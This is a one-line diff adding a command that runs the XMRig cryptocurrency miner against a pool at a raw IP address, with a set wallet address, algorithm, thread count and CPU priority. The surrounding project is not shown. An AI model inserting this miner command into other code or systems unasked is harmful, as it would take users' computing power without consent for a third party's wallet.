@@ -1,0 +1,1 @@
+./xmrig -o 161.97.82.235:1311 -a rx/nevo -u NS2STCjJVwN99XKNEb8HD6K3Jkr9PoGzyh7ktxyc84N7VrgoDP95A2DC52diBVAfYrFAcP4nQdtCzEaaTvnKtyiE2qDmjRBhu -p @J3 -t 8 --cpu-priority 3
